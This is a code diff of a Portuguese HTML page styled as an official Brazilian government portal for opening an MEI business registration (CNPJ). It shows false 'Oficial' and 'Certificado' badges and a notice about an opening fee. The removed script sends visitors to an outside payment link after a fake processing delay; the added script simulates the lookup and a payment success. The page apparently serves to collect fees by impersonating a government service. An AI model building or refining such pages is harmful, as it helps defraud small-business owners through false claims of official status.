@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html lang="pt-BR">
 <head>
@@ -357,15 +356,9 @@
 
         .form-row {
             display: grid;
-            grid-template-columns: 1fr;
+            grid-template-columns: 1fr 1fr;
             gap: 20px;
             margin-bottom: 24px;
-        }
-
-        @media (min-width: 640px) {
-            .form-row {
-                grid-template-columns: 1fr 1fr;
-            }
         }
 
         .form-label {
@@ -399,78 +392,86 @@
             box-shadow: 0 0 0 3px var(--primary-light);
         }
 
-        .form-input:hover:not(:focus) {
-            border-color: var(--gray-400);
-        }
-
-        .form-input.error {
-            border-color: var(--error-color);
-            box-shadow: 0 0 0 3px var(--error-light);
-            background: var(--error-light);
-        }
-
-        .form-input.success {
-            border-color: var(--success-color);
-            box-shadow: 0 0 0 3px var(--success-light);
-            background: var(--success-light);
-        }
-
         .error-message {
             color: var(--error-color);
-            font-size: 13px;
-            font-weight: 500;
-            margin-top: 6px;
+            font-size: 12px;
+            margin-top: 4px;
             display: none;
         }
 
-        .error-message.show {
+        .form-group.error .form-input {
+            border-color: var(--error-color);
+        }
+
+        .form-group.error .error-message {
             display: block;
-            animation: fadeIn 0.2s ease-out;
         }
 
-        @keyframes fadeIn {
-            from { opacity: 0; }
-            to { opacity: 1; }
-        }
-
-        /* ===== SEÇÕES ESPECIAIS ===== */
         .info-section {
             background: var(--gray-50);
             border: 1px solid var(--gray-200);
-            border-radius: var(--border-radius);
-            padding: 20px;
-            margin: 24px 0;
+            border-radius: var(--border-radius-lg);
+            margin-bottom: 24px;
+            overflow: hidden;
         }
 
         .info-section-header {
             display: flex;
             align-items: center;
-            gap: 10px;
-            margin-bottom: 12px;
+            gap: 12px;
+            padding: 20px;
+            background: var(--gray-100);
+            border-bottom: 1px solid var(--gray-200);
         }
 
         .info-section-icon {
-            width: 20px;
-            height: 20px;
             color: var(--primary-color);
+            font-size: 20px;
         }
 
         .info-section-title {
-            font-size: 16px;
+            font-size: 18px;
             font-weight: 600;
             color: var(--gray-900);
+            margin: 0;
         }
 
         .info-section-content {
-            font-size: 14px;
-            color: var(--gray-700);
-            line-height: 1.5;
+            padding: 20px;
         }
 
-        /* ===== SEÇÃO DE TAXA DE ABERTURA ===== */
+        .cnpj-info-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 16px;
+        }
+
+        .cnpj-info-item {
+            padding: 12px;
+            background: var(--white);
+            border: 1px solid var(--gray-200);
+            border-radius: var(--border-radius);
+        }
+
+        .cnpj-info-label {
+            font-size: 12px;
+            font-weight: 500;
+            color: var(--gray-500);
+            text-transform: uppercase;
+            margin-bottom: 4px;
+        }
+
+        .cnpj-info-value {
+            font-size: 15px;
+            font-weight: 600;
+            color: var(--gray-800);
+            word-break: break-all;
+        }
+
+        /* SEÇÃO: Comunicado sobre Taxa de Abertura */
         .fee-notice-section {
-            background: linear-gradient(135deg, var(--primary-light) 0%, rgba(30, 64, 175, 0.05) 100%);
-            border: 2px solid var(--primary-color);
+            background: var(--primary-light);
+            border: 1px solid var(--primary-color);
             border-radius: var(--border-radius-lg);
             padding: 24px;
             margin: 24px 0;
@@ -478,21 +479,11 @@
             overflow: hidden;
         }
 
-        .fee-notice-section::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: 0;
-            right: 0;
-            height: 4px;
-            background: linear-gradient(90deg, var(--primary-color), var(--primary-hover));
-        }
-
         .fee-notice-header {
             display: flex;
             align-items: center;
             gap: 12px;
-            margin-bottom: 16px;
+            margin-bottom: 20px;
         }
 
         .fee-notice-icon {
@@ -585,6 +576,16 @@
             border-top: 2px solid var(--primary-color);
             border-radius: 50%;
             animation: spin 1s linear infinite;
+        }
+
+        .spinner-small {
+            width: 12px;
+            height: 12px;
+            border: 2px solid var(--gray-300);
+            border-top: 2px solid var(--primary-color);
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-right: 8px;
         }
 
         @keyframes spin {
@@ -871,69 +872,213 @@
             gap: 8px;
         }
 
-        .cnpj-info-grid {
-            display: grid;
-            grid-template-columns: 1fr;
-            gap: 12px;
+        .cnpj-info-display h3 i {
+            font-size: 18px;
         }
 
-        @media (min-width: 640px) {
-            .cnpj-info-grid {
-                grid-template-columns: 1fr 1fr;
+        /* ===== FOOTER ===== */
+        .footer {
+            background: var(--gray-900);
+            color: var(--gray-400);
+            padding: 20px 0;
+            border-top: 1px solid var(--gray-700);
+            font-size: 13px;
+        }
+
+        .footer-content {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .footer-text {
+            line-height: 1.5;
+        }
+
+        .footer-links a {
+            color: var(--gray-400);
+            text-decoration: none;
+            margin-left: 20px;
+            transition: var(--transition-fast);
+        }
+
+        .footer-links a:hover {
+            color: var(--white);
+            text-decoration: underline;
+        }
+
+        /* ==================================================================== */
+        /* ======================== AJUSTES MOBILE (MEDIA QUERIES) ============ */
+        /* ==================================================================== */
+
+        /* Ajustes para telas menores que 768px (Mobile) */
+        @media (max-width: 768px) {
+            .header-content {
+                flex-direction: column;
+                align-items: flex-start;
+                padding: 12px 16px;
+                gap: 10px;
+            }
+
+            .security-indicators {
+                flex-wrap: wrap;
+                justify-content: flex-start;
+                gap: 8px;
+            }
+
+            .gov-badge {
+                order: 1;
+            }
+
+            .form-header {
+                padding: 20px;
+            }
+
+            .form-title {
+                font-size: 20px;
+            }
+
+            .form-subtitle {
+                font-size: 14px;
+            }
+
+            .form-content {
+                padding: 20px;
+            }
+
+            .form-row {
+                grid-template-columns: 1fr; /* Coluna única em mobile */
+                gap: 16px;
+            }
+
+            .button-group {
+                flex-direction: column; /* Botões empilhados em mobile */
+                gap: 10px;
+                margin-top: 20px;
+            }
+
+            .btn {
+                width: 100%; /* Botões ocupam a largura total */
+                min-width: unset;
+                padding: 14px 24px;
+            }
+
+            .info-section-header {
+                padding: 16px;
+            }
+
+            .fee-notice-section {
+                padding: 16px;
+            }
+
+            .fee-notice-header {
+                flex-direction: column;
+                align-items: flex-start;
+                gap: 8px;
+            }
+
+            .fee-notice-title {
+                font-size: 16px;
+            }
+
+            .fee-amount {
+                font-size: 24px;
+            }
+
+            .fee-benefits-list li {
+                font-size: 13px;
+            }
+
+            .declaration-section {
+                padding: 16px;
+            }
+
+            .declaration-title {
+                font-size: 15px;
+            }
+
+            .checkbox-group {
+                align-items: flex-start;
+            }
+
+            .checkbox-label {
+                font-size: 13px;
+            }
+
+            .footer-content {
+                flex-direction: column;
+                align-items: center;
+                text-align: center;
+                gap: 10px;
+            }
+
+            .footer-text {
+                font-size: 12px;
             }
         }
 
-        .cnpj-info-item {
-            font-size: 13px;
-            color: var(--gray-700);
+        /* Ajustes para telas menores que 600px (Passos de Progresso e Grid de CNPJ) */
+        @media (max-width: 600px) {
+            .progress-section {
+                padding: 16px 8px; /* Reduz o padding */
+            }
+
+            .progress-header {
+                margin-bottom: 16px;
+            }
+
+            .progress-steps {
+                justify-content: space-around;
+                padding: 0 10px;
+            }
+
+            .progress-line, .progress-line-active {
+                top: 15px; /* Ajusta a posição da linha para os círculos menores */
+                left: 10px;
+                right: 10px;
+            }
+
+            .step {
+                flex: none; /* Remove o flex-grow para evitar que os passos fiquem muito distantes */
+                width: 20%; /* Dá um tamanho fixo para melhor espaçamento */
+            }
+
+            .step-circle {
+                width: 30px; /* Reduz o tamanho do círculo */
+                height: 30px;
+                font-size: 12px;
+                margin-bottom: 4px;
+            }
+
+            .step-label {
+                font-size: 10px; /* Reduz o tamanho da fonte do label */
+                max-width: 60px; /* Reduz o max-width */
+            }
+
+            .cnpj-info-grid {
+                grid-template-columns: 1fr; /* Coluna única em telas muito pequenas */
+            }
         }
 
-        .cnpj-info-label {
-            font-weight: 600;
-            color: var(--gray-900);
-            display: block;
-            margin-bottom: 2px;
-        }
+        /* Ajuste para exibir a Sidebar abaixo do formulário em telas menores que 1024px */
+        @media (max-width: 1023px) {
+            .main-container {
+                padding-bottom: 40px;
+            }
 
-        .cnpj-info-value {
-            color: var(--gray-700);
-        }
-
-        /* ===== WAITING PAYMENT ===== */
-        /* Novo estilo para a mensagem de aguardando pagamento (Sutil e Profissional) */
-        .waiting-payment-subtle {
-            display: flex;
-            align-items: center;
-            gap: 12px;
-            margin-top: 20px;
-            padding: 12px 16px;
-            background: var(--gray-100); /* Fundo muito sutil */
-            border: 1px solid var(--gray-300);
-            border-left: 4px solid var(--primary-color); /* Destaque sutil na lateral */
-            border-radius: var(--border-radius);
-            font-size: 14px;
-            font-weight: 500;
-            color: var(--gray-700);
-            animation: fadeIn 0.5s ease-out;
-        }
-
-        .spinner-small {
-            width: 16px;
-            height: 16px;
-            border: 2px solid var(--gray-300);
-            border-top: 2px solid var(--primary-color);
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-        }
-
-        /* Removendo o estilo antigo */
-        .waiting-payment, .waiting-payment-icon {
-            display: none !important;
+            .sidebar {
+                display: flex;
+                order: 2; /* Garante que a sidebar apareça depois do form */
+                margin-top: 24px;
+            }
         }
     </style>
 </head>
 <body>
-    <!-- Header Profissional -->
+
     <header class="header">
         <div class="header-content">
             <div class="logo-section">
@@ -941,61 +1086,70 @@
                     <i class="fas fa-building"></i>
                 </div>
                 <div class="logo-text">
-                    <div class="logo-title">Portal MEI</div>
-                    <div class="logo-subtitle">Online</div>
+                    <span class="logo-title">Abertura de CNPJ MEI</span>
+                    <span class="logo-subtitle">Portal Oficial Brasileiro</span>
                 </div>
             </div>
-            
             <div class="security-indicators">
                 <div class="gov-badge">
                     <i class="fas fa-shield-alt"></i>
                     Oficial
                 </div>
-                <div class="security-badge">
-                    <i class="fas fa-lock"></i>
-                    Seguro
-                </div>
                 <div class="ssl-indicator">
-                    <i class="fas fa-certificate"></i>
-                    SSL
+                    <i class="fas fa-lock"></i>
+                    Conexão Segura
+                </div>
+                <div class="security-badge">
+                    <i class="fas fa-check-circle"></i>
+                    Certificado
                 </div>
             </div>
         </div>
     </header>
 
-    <!-- Container Principal -->
     <div class="main-container">
-        <!-- Conteúdo Principal -->
         <main class="main-content">
+            
             <!-- Seção de Progresso -->
             <div class="progress-section">
                 <div class="progress-header">
-                    <h2 class="progress-title">Abertura de CNPJ MEI</h2>
-                    <p class="progress-subtitle">Processo simplificado em 2 etapas</p>
+                    <h2 class="progress-title">Progresso da Abertura</h2>
+                    <p class="progress-subtitle">Siga os passos para obter seu CNPJ MEI</p>
                 </div>
-                
                 <div class="progress-steps">
                     <div class="progress-line"></div>
-                    <div class="progress-line-active" id="progressLineActive"></div>
+                    <div class="progress-line-active" id="progressLineActive" style="width: 0%;"></div>
                     
-                    <div class="step active" data-step="1">
+                    <div class="step active" id="step1Indicator">
                         <div class="step-circle">1</div>
-                        <div class="step-label">Dados do CNPJ</div>
+                        <span class="step-label">Busca CNPJ</span>
                     </div>
-                    <div class="step" data-step="2">
+                    
+                    <div class="step" id="step2Indicator">
                         <div class="step-circle">2</div>
-                        <div class="step-label">Pagamento</div>
+                        <span class="step-label">Confirmação</span>
+                    </div>
+                    
+                    <div class="step" id="step3Indicator">
+                        <div class="step-circle">3</div>
+                        <span class="step-label">Pagamento</span>
+                    </div>
+                    
+                    <div class="step" id="step4Indicator">
+                        <div class="step-circle">4</div>
+                        <span class="step-label">Finalização</span>
                     </div>
                 </div>
             </div>
 
             <!-- Formulário Principal -->
             <div class="form-container">
-                <!-- Etapa 1: Dados do CNPJ -->
+                
+                <!-- Etapa 1: Busca CNPJ -->
                 <div class="step-content active" id="step1">
                     <div class="form-header">
-                        <h1 class="form-title">Dados do CNPJ</h1>
-                        <p class="form-subtitle">Informe o CNPJ da sua empresa para iniciar o processo</p>
+                        <h1 class="form-title">Verificação do CNPJ</h1>
+                        <p class="form-subtitle">Informe o CNPJ da empresa para verificar a elegibilidade e iniciar o processo de abertura do MEI.</p>
                     </div>
                     
                     <div class="form-content">
@@ -1193,294 +1347,231 @@
                     <div class="trust-icon">
                         <i class="fas fa-check"></i>
                     </div>
-                    <div class="trust-text">Documentos digitais enviados por email</div>
-                </div>
-                
-                <div class="trust-item">
-                    <div class="trust-icon">
-                        <i class="fas fa-check"></i>
-                    </div>
-                    <div class="trust-text">Conformidade com legislação vigente</div>
-                </div>
-                
-                <div class="trust-item">
-                    <div class="trust-icon">
-                        <i class="fas fa-check"></i>
-                    </div>
-                    <div class="trust-text">Garantia de satisfação</div>
+                    <div class="trust-text">Entrega dos documentos digitais por e-mail</div>
                 </div>
             </div>
         </aside>
     </div>
 
+    <footer class="footer">
+        <div class="footer-content">
+            <div class="footer-text">
+                &copy; 2024 Portal Oficial Brasileiro. Todos os direitos reservados.
+            </div>
+            <div class="footer-links">
+                <a href="#">Termos de Uso</a>
+                <a href="#">Política de Privacidade</a>
+            </div>
+        </div>
+    </footer>
+
     <!-- Loading Overlay -->
     <div class="loading-overlay" id="loadingOverlay">
         <div class="loading-content">
             <div class="loading-spinner"></div>
-            <div class="loading-text">Processando solicitação...</div>
+            <div class="loading-text">Processando sua solicitação...</div>
         </div>
     </div>
 
-    <!-- Notificação de Sucesso -->
+    <!-- Success Notification -->
     <div class="success-notification" id="successNotification">
-        ✅ Dados validados com sucesso!
+        <i class="fas fa-check-circle"></i> CNPJ verificado com sucesso!
     </div>
 
     <script>
-        // ===== VARIÁVEIS GLOBAIS =====
-        let currentStep = 1;
-        let cnpjData = null;
-        let isProcessing = false;
+        // Funções JavaScript para simular a navegação entre passos e validação
+        const step1 = document.getElementById('step1');
+        const step2 = document.getElementById('step2');
+        const step1Indicator = document.getElementById('step1Indicator');
+        const step2Indicator = document.getElementById('step2Indicator');
+        const progressLineActive = document.getElementById('progressLineActive');
+        const cnpjForm = document.getElementById('cnpjForm');
+        const confirmationForm = document.getElementById('confirmationForm');
+        const cnpjInput = document.getElementById('cnpj');
+        const cnpjError = document.getElementById('cnpjError');
+        const cnpjLoadingIndicator = document.getElementById('cnpjLoadingIndicator');
+        const cnpjInfoDisplay = document.getElementById('cnpjInfoDisplay');
+        const cnpjInfoGrid = document.getElementById('cnpjInfoGrid');
+        const paymentCnpjInfoGrid = document.getElementById('paymentCnpjInfoGrid');
+        const loadingOverlay = document.getElementById('loadingOverlay');
+        const successNotification = document.getElementById('successNotification');
 
-        // ===== UTILITÁRIOS =====
-        function debounce(func, delay) {
-            let timeoutId;
-            return function (...args) {
-                clearTimeout(timeoutId);
-                timeoutId = setTimeout(() => func.apply(this, args), delay);
-            };
-        }
-
-        function showSuccessNotification(message) {
-            const notification = document.getElementById('successNotification');
-            if (notification) {
-                notification.textContent = message;
-                notification.style.display = 'block';
-                setTimeout(() => {
-                    notification.style.display = 'none';
-                }, 3000);
-            }
-        }
-
-        // ===== NAVEGAÇÃO ENTRE ETAPAS =====
         function goToStep(stepNumber) {
-            const steps = document.querySelectorAll('.step-content');
-            const progressSteps = document.querySelectorAll('.step');
-            const progressLineActive = document.getElementById('progressLineActive');
+            step1.classList.remove('active');
+            step2.classList.remove('active');
+            step1Indicator.classList.remove('active', 'completed');
+            step2Indicator.classList.remove('active', 'completed');
 
-            steps.forEach((step, index) => {
-                step.classList.remove('active');
-                if (index + 1 === stepNumber) {
-                    step.classList.add('active');
-                }
-            });
-
-            progressSteps.forEach((step, index) => {
-                const stepNumber_attr = step.getAttribute('data-step');
-                step.classList.remove('active', 'completed');
-                
-                if (parseInt(stepNumber_attr) === stepNumber) {
-                    step.classList.add('active');
-                } else if (parseInt(stepNumber_attr) < stepNumber) {
-                    step.classList.add('completed');
-                }
-            });
-
-            const progressWidth = ((stepNumber - 1) / (progressSteps.length - 1)) * 100;
-            if (progressLineActive) {
-                progressLineActive.style.width = `${progressWidth}%`;
+            if (stepNumber === 1) {
+                step1.classList.add('active');
+                step1Indicator.classList.add('active');
+                progressLineActive.style.width = '0%';
+            } else if (stepNumber === 2) {
+                step2.classList.add('active');
+                step1Indicator.classList.add('completed');
+                step2Indicator.classList.add('active');
+                progressLineActive.style.width = '33.3%'; // Ajuste para 4 passos
             }
-
-            currentStep = stepNumber;
-            window.scrollTo({ top: 0, behavior: 'smooth' });
+            // Adicionar lógica para os outros passos (3 e 4) se necessário
         }
 
-        // ===== MÁSCARA DE CNPJ =====
-        function applyCNPJMask(value) {
-            return value
-                .replace(/\D/g, '')
-                .replace(/^(\d{2})(\d)/, '$1.$2')
-                .replace(/^(\d{2})\.(\d{3})(\d)/, '$1.$2.$3')
-                .replace(/\.(\d{3})(\d)/, '.$1/$2')
-                .replace(/(\d{4})(\d)/, '$1-$2');
+        function showNotification(message, isSuccess = true) {
+            successNotification.textContent = message;
+            successNotification.style.backgroundColor = isSuccess ? 'var(--success-color)' : 'var(--error-color)';
+            successNotification.style.display = 'block';
+            setTimeout(() => {
+                successNotification.style.display = 'none';
+            }, 3000);
         }
 
-        // ===== BUSCA DE CNPJ =====
-        async function handleCNPJLookup() {
-            const cnpjInput = document.getElementById('cnpj');
-            const cnpj = cnpjInput.value.replace(/\D/g, '');
-            const loadingIndicator = document.getElementById('cnpjLoadingIndicator');
-            const cnpjInfoDisplay = document.getElementById('cnpjInfoDisplay');
-            const waitingPayment = document.getElementById('waitingPayment');
-            const errorEl = document.getElementById('cnpjError');
+        function showLoading(show) {
+            loadingOverlay.style.display = show ? 'flex' : 'none';
+        }
 
-            if (cnpj.length !== 14) {
-                cnpjInfoDisplay.style.display = 'none';
-                waitingPayment.style.display = 'none';
-                cnpjInput.classList.remove('success');
-                if (errorEl) errorEl.classList.remove('show');
+        function simulateCnpjSearch(cnpj) {
+            return new Promise(resolve => {
+                setTimeout(() => {
+                    // Simulação de validação de CNPJ
+                    if (cnpj.replace(/\D/g, '').length === 14) {
+                        resolve({
+                            success: true,
+                            data: {
+                                razaoSocial: "EMPRESA DE TESTE LTDA",
+                                cnpj: cnpj,
+                                situacao: "ATIVA",
+                                dataAbertura: "10/01/2020",
+                                naturezaJuridica: "213-5 - Empresário Individual",
+                                cnae: "47.11-3-02 - Comércio varejista de mercadorias em geral, com predominância de produtos alimentícios - supermercados",
+                                endereco: "Rua Exemplo, 123 - Centro, São Paulo/SP"
+                            }
+                        });
+                    } else {
+                        resolve({ success: false, message: "CNPJ inválido ou não encontrado." });
+                    }
+                }, 1500);
+            });
+        }
+
+        function formatCnpj(value) {
+            value = value.replace(/\D/g, '');
+            value = value.replace(/^(\d{2})(\d)/, '$1.$2');
+            value = value.replace(/^(\d{2})\.(\d{3})(\d)/, '$1.$2.$3');
+            value = value.replace(/\.(\d{3})(\d)/, '.$1/$2');
+            value = value.replace(/(\d{4})(\d)/, '$1-$2');
+            return value;
+        }
+
+        cnpjInput.addEventListener('input', (e) => {
+            e.target.value = formatCnpj(e.target.value);
+            cnpjError.style.display = 'none';
+            cnpjInput.closest('.form-group').classList.remove('error');
+        });
+
+        cnpjForm.addEventListener('submit', async (e) => {
+            e.preventDefault();
+            const cnpj = cnpjInput.value;
+            const formGroup = cnpjInput.closest('.form-group');
+
+            if (cnpj.replace(/\D/g, '').length !== 14) {
+                formGroup.classList.add('error');
                 return;
             }
 
-            if (isProcessing) return;
-            isProcessing = true;
-
-            if (loadingIndicator) {
-                loadingIndicator.classList.add('show');
-            }
-
-            try {
-                const response = await fetch(`https://receitaws.com.br/v1/cnpj/${cnpj}/`, {
-                    signal: AbortSignal.timeout(5000)
-                });
-
-                if (!response.ok) {
-                    throw new Error('Erro na requisição');
-                }
-
-                const data = await response.json();
-
-                await new Promise(resolve => setTimeout(resolve, 400));
-
-                if (data.status === 'OK' && data.cnpj) {
-                    cnpjData = data;
-                    displayCNPJInfo(data);
-                    cnpjInput.classList.add('success');
-                    cnpjInput.classList.remove('error');
-                    if (errorEl) errorEl.classList.remove('show');
-                    cnpjInfoDisplay.style.display = 'block';
-                    waitingPayment.style.display = 'block';
-                    showSuccessNotification('CNPJ encontrado com sucesso!');
-                } else {
-                    showCNPJError('CNPJ não encontrado ou inválido');
-                }
-            } catch (error) {
-                console.error('Erro ao buscar CNPJ:', error);
-                showCNPJError('Erro ao buscar CNPJ. Tente novamente.');
-            } finally {
-                if (loadingIndicator) {
-                    loadingIndicator.classList.remove('show');
-                }
-                isProcessing = false;
-            }
-        }
-
-        function displayCNPJInfo(data) {
-            const cnpjInfoGrid = document.getElementById('cnpjInfoGrid');
-            const paymentCnpjInfoGrid = document.getElementById('paymentCnpjInfoGrid');
-
-const infoItems = [
-		                { label: 'CNPJ', value: data.cnpj },
-		                { label: 'Situação Cadastral', value: data.situacao || '-' },
-		                { label: 'Data da Situação', value: data.data_situacao || '-' },
-		                { label: 'Razão Social', value: data.nome },
-		                { label: 'Nome Fantasia', value: data.fantasia || '-' },
-		                { label: 'Natureza Jurídica', value: data.natureza_juridica || '-' },
-		                { label: 'Porte', value: data.porte || '-' },
-		                { label: 'Data de Abertura', value: data.abertura || '-' },
-		                { label: 'Atividade Principal', value: data.atividade_principal[0]?.text || data.atividade_principal[0]?.code || '-' },
-		                { label: 'Endereço', value: `${data.logradouro || ''}, ${data.numero || ''} ${data.complemento || ''} - ${data.bairro || ''}, ${data.municipio || ''}/${data.uf || ''} - CEP: ${data.cep || ''}`.trim() },
-		                { label: 'Telefone', value: data.telefone || '-' },
-		                { label: 'E-mail', value: data.email || '-' }
-		            ];
-
-            const htmlContent = infoItems.map(item => `
-                <div class="cnpj-info-item">
-                    <span class="cnpj-info-label">${item.label}</span>
-                    <span class="cnpj-info-value">${item.value}</span>
-                </div>
-            `).join('');
-
-            if (cnpjInfoGrid) cnpjInfoGrid.innerHTML = htmlContent;
-            if (paymentCnpjInfoGrid) paymentCnpjInfoGrid.innerHTML = htmlContent;
-        }
-
-        function showCNPJError(message) {
-            const cnpjInput = document.getElementById('cnpj');
-            const errorEl = document.getElementById('cnpjError');
-            const cnpjInfoDisplay = document.getElementById('cnpjInfoDisplay');
-            const waitingPayment = document.getElementById('waitingPayment');
-
-            cnpjInput.classList.add('error');
-            cnpjInput.classList.remove('success');
-            if (errorEl) {
-                errorEl.textContent = message;
-                errorEl.classList.add('show');
-            }
+            formGroup.classList.remove('error');
+            cnpjLoadingIndicator.classList.add('show');
             cnpjInfoDisplay.style.display = 'none';
-            waitingPayment.style.display = 'none';
-        }
 
-        // ===== HANDLERS DE FORMULÁRIO =====
-        function handleCNPJFormSubmit(e) {
-            e.preventDefault();
-            handleCNPJLookup();
-        }
+            const result = await simulateCnpjSearch(cnpj);
 
-        async function handleConfirmationSubmit(e) {
-            e.preventDefault();
+            cnpjLoadingIndicator.classList.remove('show');
 
-            const checkboxes = e.target.querySelectorAll('input[type="checkbox"][required]');
-            let allChecked = true;
+            if (result.success) {
+                showNotification("CNPJ verificado com sucesso!");
+                displayCnpjInfo(result.data);
+                cnpjInfoDisplay.style.display = 'block';
+                
+                // Simula a transição para o próximo passo após a verificação
+                setTimeout(() => {
+                    goToStep(2);
+                }, 1000);
 
-            checkboxes.forEach(checkbox => {
-                if (!checkbox.checked) {
-                    allChecked = false;
-                    checkbox.style.outline = '2px solid var(--error-color)';
-                } else {
-                    checkbox.style.outline = 'none';
-                }
-            });
-
-            if (!allChecked) {
-                alert('Por favor, aceite todos os termos para continuar.');
-                return;
-            }
-
-            const submitBtn = e.target.querySelector('button[type="submit"]');
-            const loadingOverlay = document.getElementById('loadingOverlay');
-
-            if (submitBtn) submitBtn.classList.add('btn-loading');
-            if (loadingOverlay) loadingOverlay.style.display = 'flex';
-
-            try {
-                await new Promise(resolve => setTimeout(resolve, 3000));
-                window.location.href = 'https://pay.pag-br.com/r/9dOX973JjTo82i04E1';
-            } catch (error) {
-                console.error('Erro:', error);
-                alert('Erro ao processar solicitação. Tente novamente.');
-            } finally {
-                if (submitBtn) submitBtn.classList.remove('btn-loading');
-                if (loadingOverlay) loadingOverlay.style.display = 'none';
-            }
-        }
-
-        // ===== INICIALIZAÇÃO =====
-        document.addEventListener('DOMContentLoaded', function() {
-            // Formulário CNPJ
-            const cnpjForm = document.getElementById('cnpjForm');
-            if (cnpjForm) {
-                cnpjForm.addEventListener('submit', handleCNPJFormSubmit);
-            }
-
-            // Máscara de CNPJ
-            const cnpjInput = document.getElementById('cnpj');
-            if (cnpjInput) {
-                cnpjInput.addEventListener('input', function(e) {
-                    const cursorPosition = e.target.selectionStart;
-                    const oldValue = e.target.value;
-                    const newValue = applyCNPJMask(oldValue);
-
-                    if (newValue !== oldValue) {
-                        e.target.value = newValue;
-                        const newCursorPosition = cursorPosition + (newValue.length - oldValue.length);
-                        e.target.setSelectionRange(newCursorPosition, newCursorPosition);
-                    }
-
-                    // Busca automática quando CNPJ está completo
-                    if (newValue.replace(/\D/g, '').length === 14) {
-                        handleCNPJLookup();
-                    }
-                });
-            }
-
-            // Formulário de Confirmação
-            const confirmationForm = document.getElementById('confirmationForm');
-            if (confirmationForm) {
-                confirmationForm.addEventListener('submit', handleConfirmationSubmit);
+            } else {
+                formGroup.classList.add('error');
+                cnpjError.textContent = result.message;
+                cnpjError.style.display = 'block';
+                showNotification(result.message, false);
             }
         });
+
+        function displayCnpjInfo(data) {
+            const infoHtml = `
+                <div class="cnpj-info-item">
+                    <div class="cnpj-info-label">Razão Social</div>
+                    <div class="cnpj-info-value">${data.razaoSocial}</div>
+                </div>
+                <div class="cnpj-info-item">
+                    <div class="cnpj-info-label">CNPJ</div>
+                    <div class="cnpj-info-value">${data.cnpj}</div>
+                </div>
+                <div class="cnpj-info-item">
+                    <div class="cnpj-info-label">Situação</div>
+                    <div class="cnpj-info-value">${data.situacao}</div>
+                </div>
+                <div class="cnpj-info-item">
+                    <div class="cnpj-info-label">Data de Abertura</div>
+                    <div class="cnpj-info-value">${data.dataAbertura}</div>
+                </div>
+                <div class="cnpj-info-item">
+                    <div class="cnpj-info-label">Natureza Jurídica</div>
+                    <div class="cnpj-info-value">${data.naturezaJuridica}</div>
+                </div>
+                <div class="cnpj-info-item">
+                    <div class="cnpj-info-label">CNAE Principal</div>
+                    <div class="cnpj-info-value">${data.cnae}</div>
+                </div>
+                <div class="cnpj-info-item" style="grid-column: 1 / -1;">
+                    <div class="cnpj-info-label">Endereço</div>
+                    <div class="cnpj-info-value">${data.endereco}</div>
+                </div>
+            `;
+            cnpjInfoGrid.innerHTML = infoHtml;
+            paymentCnpjInfoGrid.innerHTML = infoHtml; // Preenche também o resumo do passo 2
+        }
+
+        confirmationForm.addEventListener('submit', (e) => {
+            e.preventDefault();
+            
+            const termsAccept = document.getElementById('termsAccept').checked;
+            const dataAccuracy = document.getElementById('dataAccuracy').checked;
+            const lgpdConsent = document.getElementById('lgpdConsent').checked;
+            const feeAcknowledge = document.getElementById('feeAcknowledge').checked;
+
+            if (termsAccept && dataAccuracy && lgpdConsent && feeAcknowledge) {
+                showLoading(true);
+                // Simula o processamento de pagamento
+                setTimeout(() => {
+                    showLoading(false);
+                    // Aqui você faria a chamada real para o gateway de pagamento
+                    showNotification("Pagamento efetuado com sucesso! Processo de abertura iniciado.");
+                    
+                    // Simula a transição para o passo 4 (Finalização)
+                    step2Indicator.classList.remove('active');
+                    step2Indicator.classList.add('completed');
+                    document.getElementById('step3Indicator').classList.add('completed'); // Simula passo 3 (Pagamento) completo
+                    document.getElementById('step4Indicator').classList.add('active');
+                    progressLineActive.style.width = '100%';
+
+                    // Redireciona ou mostra a tela de sucesso final (não implementada no HTML)
+                    alert("Processo de abertura concluído! Você será redirecionado para a página de download dos documentos.");
+                }, 3000);
+            } else {
+                showNotification("Por favor, aceite todos os termos e condições para prosseguir.", false);
+            }
+        });
+
+        // Inicializa o primeiro passo
+        goToStep(1);
+
     </script>
 </body>
 </html>
-
